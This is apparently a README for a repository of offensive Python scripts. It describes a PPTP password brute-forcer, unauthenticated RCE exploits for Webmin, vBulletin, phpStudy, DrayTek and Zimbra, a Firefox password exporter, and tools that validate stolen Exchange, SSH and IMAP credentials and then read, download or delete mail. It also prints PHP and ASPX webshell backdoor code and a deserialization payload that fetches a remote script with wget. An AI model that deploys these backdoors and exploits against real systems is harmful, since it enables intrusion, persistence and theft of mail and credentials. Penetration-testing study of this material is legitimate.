# Homework-of-Python
Python codes of my blog.

### pptp_password_hack.py

Use Brute-force attack to get the password of PPTP VPN.

It'll read the passwords in file(named wordlist) and then use pptpsetup to connect to the server.

The time interval is 10 seconds.

---

### portscan.py

Use to scan port.

The timeout is 3 seconds.

c++ version：

https://github.com/3gstudent/Homework-of-C-Language/blob/master/portscan.cpp

---

### urltoip.py

Use to get ip from url.

I can use the result of Sublist3r directly.

### file_deduplication(For_urltoip).py

Use to remove duplicate ip from the result of Sublist3r.

I can use the result of urltoip.py directly.

The IP can be sorted by using Sublime(F9).

---

### file_deduplication.py

Use to remove duplicate items from file.

### Webmin<=1.920-Unauthenticated_RCE(CVE-2019-15107).py

Reference:

https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html

---

### fofa_api.py

Used to call fofa's api and print the IP from the results.

You can get 100 results.

### fofa_api_VIP.py

Used to call fofa's api and print the IP from the results.

If you're VIP,you'll get 10000 results.

---

### vBulletin_5.x_0day_pre-auth_RCE.py

Reference:

https://seclists.org/fulldisclosure/2019/Sep/31

Eg.

```
echo \<?php @eval\(\$_POST[pwd]\)\;?\> >test.php
```

---

### phpStudy_5.2-5.45_(php_xmlrpc.dll)_backdoor_RCE.py

Reference:

https://mp.weixin.qq.com/s/dTzWfYGdkNqEl0vd72oC2w

Eg.

```
system('cmd /c "echo ^<?php @eval(^$_POST[pwd]);?^> >D:\phpstudy\WWW\test.php"');
```

---

### ExportFirefoxPassword.py

Use to export the password of the Firefox

### get_Exchange_version.py

Use to get the version of Exchange.

First get the BuildNumber through the souce code of the URL and then get the version.

Reference:

https://docs.microsoft.com/en-us/Exchange/new-features/build-numbers-and-release-dates?redirectedfrom=MSDN&view=exchserver-2019

---

### SMBv3_RCE_Scanner(CVE-2020-0796).py

Use to scan the SMBv3 RCE vulnerability.

The timeout is 3 seconds.

---

### Unauthenticated_RCE_in_Draytek_Vigor2960\3900\300B.py

Reference:

https://github.com/imjdl/CVE-2020-8515-PoC

CVE-2020-8515

DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta, and Vigor300B 1.3.3_Beta, 1.4.2.1_Beta, and 1.4.4_Beta devices allow remote code execution as root (without authentication) via shell metacharacters to the cgi-bin/mainfunction.cgi URI..

Affected Products:
- Vigor300B <v1.5.1
- Vigor2960 <v1.5.1
- Vigor3900 <v1.5.1

---

### Zimbra_SOAP_API_Manage.py

Use Zimbra SOAP API to connect the Zimbra mail server.

Usage:

```
      Zimbra_SOAP_API.py <url> <username> <password> <mode>
```

mode:

- low       auth for low token
- admin     auth for admin token
- ssrf      Use CVE-2019-9621 to get the admin token
      
Eg:

```
      Zimbra_SOAP_API.py https://192.168.1.1 user1@mail.zimbra password low
```

---

### checkEWS.py

Use to check the valid account of Exchange Web Service(Support plaintext and ntlmhash)

Reference:https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py

Usage:

```
checkEWS.py <host> <port> <mode> <domain> <user> <password>
<mode>:
- plaintext
- ntlmhash
```

Eg.

```
checkEWS.py 192.168.1.1 443 plaintext test.com user1 password1
checkEWS.py test.com 80 ntlmhash test.com user1 c5a237b7e9d8e708d8436b6148a25fa1
```

### checkAutodiscover.py

Use to access Autodiscover.xml and get the user's configuration(Support plaintext and ntlmhash)

Usage:

```
checkAutodiscover.py <host> <port> <mode> <email> <password> <command>
<command>:
- checkautodiscover
- getusersetting
- checkoab
- downloadlzx
```

Eg.

```
checkAutodiscover.py 192.168.1.1 443 plaintext user1@test.com password1 checkaut
odiscover
checkAutodiscover.py test.com 80 ntlmhash user1@test.com c5a237b7e9d8e708d8436b6
148a25fa1 getusersetting
```

### checkAutodiscoverEx.py

Extra mode of checkAutodiscover.py

Add a <domain> parameter
      
### ewsManage.py   
  
Use to access Exchange Web Service(Support plaintext and ntlmhash)

Usage:

```
ewsManage.py <host> <port> <mode> <domain> <user> <password> <command>
<mode>:
- plaintext
- ntlmhash
<command>:
- getfolderofinbox
- getfolderofsentitems
- listmailofinbox
- listmailofsentitems
- listmailoffolder
- getmail
- deletemail
- deletefolder
- getattachment
- saveattachment
- getdelegateofinbox
- adddelegateofinbox
- updatedelegateofinbox
- removedelegateofinbox
- getdelegateofinbox2
- updatedelegateofinbox2
- restoredelegateofinbox2
- getinboxrules
- updateinboxrules
- removeinboxrules
- deleteattachment
- createattachment
- createfolderofinbox
- listhiddenfolderofinbox
- createtestmail
- SetHiddenPropertyType
- UpdateHiddenPropertyType
- getcontact
- findpeople
- findallpeople
- resolvename
- resolveallname


```

Eg.

```
ewsManage.py 192.168.1.1 443 plaintext test.com user1 password1 getfolderofinbox
ewsManage.py test.com 80 ntlmhash test.com user1 c5a237b7e9d8e708d8436b6148a25fa1 listmailofinbox
```

---

### sshCheck.py

Use to check the valid credential of SSH(Support password and privatekeyfile)

Usage:

```
sshCheck.py <host> <port> <mode><user> <password>
<mode>:
- plaintext
- keyfile
```

Eg.

```
sshCheck.py 192.168.1.1 22 plaintext root toor
sshCheck.py 192.168.1.1 22 keyfile root id_rsa
```

### sshRunCmd

Remote command execution via SSH(Support password and privatekeyfile)

Usage:

```
sshRunCmd.py <host> <port> <mode><user> <password> <cmd>
<mode>:
- plaintext
- keyfile
If the <cmd> is shell,you will get an interactive shell
```

Eg.

```
sshRunCmd.py 192.168.1.1 22 plaintext root toor shell
sshRunCmd.py 192.168.1.1 22 keyfile root id_rsa ps
```

---

### easCheck.py

Use to check the valid credential of eas(Exchange Server ActiveSync)

Usage:

```
easCheck.py <host> <user> <password>
```

Eg.

```
easCheck.py 192.168.1.1 user1 password1
```

---

### checkOWA.py

Use to check the valid account of Exchange by connecting to OWA.

Usage:

```
checkOWA.py <url> <user> <password>
```

### owaManage.py

Use to read mails by connecting to OWA.

Usage:

```
owaManage.py  <url> <user> <password> <command>
<command>
- ListFolder
- ViewMail
- DownloadAttachment
```

---

### imapManage.py

Use IMAP to connect to the mail server.

Usage:

```
imapManage.py <IMAP server> <username> <password> <command>    
<command>:
CheckConfig             get the folder name
SaveAttachOfInbox       save the attachments of Inbox
SaveAttachOfSent        save the attachments of Sent
DownloadAllMailOfInbox  download all the mails of Inbox
DownloadAllMailOfSent   download all the mails of Sent
Eg:
imapManage.py 192.168.1.1 user1 password CheckConfig
```

---

### aspxCmdNTLM.py 


Use to implement NTLM authentication and communicate with [execCmd.aspx](https://github.com/3gstudent/test/blob/master/execCmd.aspx)

Communication data is encoded with Base64

Usage:

```
aspxCmdNTLM.py <host> <port> <url> <mode> <domain> <user> <password> <command>
<mode>:
- plaintext
- ntlmhash
Eg.
aspxCmdNTLM.py 192.168.1.1 443 https://192.168.1.1/1.txt plaintext test.com user
1 password1 whoami
aspxCmdNTLM.py test.com 80 http://192.168.1.1/1.aspx ntlmhash test.com user1 c5a
237b7e9d8e708d8436b6148a25fa1 whoami
```

---

### SharpExchangeBackdoor.py

C sharp Version: [SharpExchangeBackdoor.cs](https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpExchangeBackdoor.cs)

Use to send payload to the Exchange webshell backdoor.

Support:

- assemblyLoad
- webshellWrite

Usage:

```
    <url> <user> <password> <mode> <path>
mode:
    assemblyLoad
    webshellWrite
```

eg.

```
    SharpExchangeBackdoor.py https://192.168.1.1/owa/auth/errorFE.aspx no auth assemblyLoad payload.dll
    SharpExchangeBackdoor.py https://192.168.1.1/ecp/About.aspx user1 123456 webshellWrite payload.aspx
```

assemblyLoad.aspx:

```
<%@ Page Language="C#" %><%System.Reflection.Assembly.Load(Convert.FromBase64String(Request.Form["demodata"])).CreateInstance("Payload").Equals("");%>
```

webshellWrite.aspx:

```
<%@ Page Language="C#" %><%if (Request.Files.Count!=0)Request.Files[0].SaveAs(Server.MapPath("./uploadDemo.aspx"));}%>
```

---

### Zimbra_deserialization_RCE(CVE-2019-6980).py

Insecure object deserialization - IMAP

Usage:

```
<url> <user> <password> <payload path>
```

Eg.

```
https://192.168.1.1 user1@test.com password1 payload.obj
```

Note:

You can generate payload.obj like this:

`java -jar ysoserial.jar MozillaRhino2 "/usr/bin/wget https://192.168.1.1/test.sh --no-check-certificate -O /tmp/test.sh" > payload.obj`

----

### ExchangeDeserializeShell-NoAuth-TextFormattingRunProperties.py

### ExchangeDeserializeShell-NoAuth-ActivitySurrogateSelectorFromFile.py

### ExchangeDeserializeShell-NoAuth-ghostfile.py

Use to test the deserializing code execution of Exchange.            
From read and write permissions of Exchange files to deserializing code execution.
You should modify the machineKey in %ExchangeInstallPath%\\FrontEnd\\HttpProxy\\<path>\\web.config to implement deserializing code execution.
`<path>`:owa or ecp
            
Usage:

```
    <url> <key> <path>
```

eg.    

```
 192.168.1.1 CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF owa
 mail.test.com CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF ecp    
```

----
